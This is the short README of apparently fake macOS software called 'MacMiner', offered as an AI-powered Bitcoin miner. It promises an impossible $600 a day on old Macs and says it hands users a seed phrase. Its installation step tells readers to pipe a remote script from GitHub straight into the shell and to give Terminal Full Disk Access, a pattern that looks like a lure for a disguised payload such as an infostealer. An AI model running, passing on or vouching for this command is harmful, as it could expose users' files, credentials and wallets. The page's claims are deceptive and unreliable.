# MacMiner — AI-Powered Bitcoin Mining for MacOS
At home Bitcoin mining for all!

MacMiner is an experimental macOS Bitcoin miner that combines high-performance hashing with an AI-driven prediction engine designed to optimize performance. 
Current returns are close to $600/day. At the end of each mining session, you will be provided with a 12 word seed phrase. This can be imported into any Bitcoin wallet.
It runs in the background on any Mac from the last 15 years, and electricity costs are similar to a lightbulb. Required disk space ~100MB

# Installation instructions:

Open the Terminal app and paste in:

`curl -fsSL https://raw.githubusercontent.com/macminer-web/macminer/main/run.sh | /bin/sh`

Follow instructions on screen. Full Disk Access must be given to Terminal to enable hardware acceleration

# Binaries

Software is provided as pre-compiled binaries for both Intel and Apple Silicon

Minimum MacOS Version: Big Sur



Disclaimer: this software is provided as-is with no guarantees
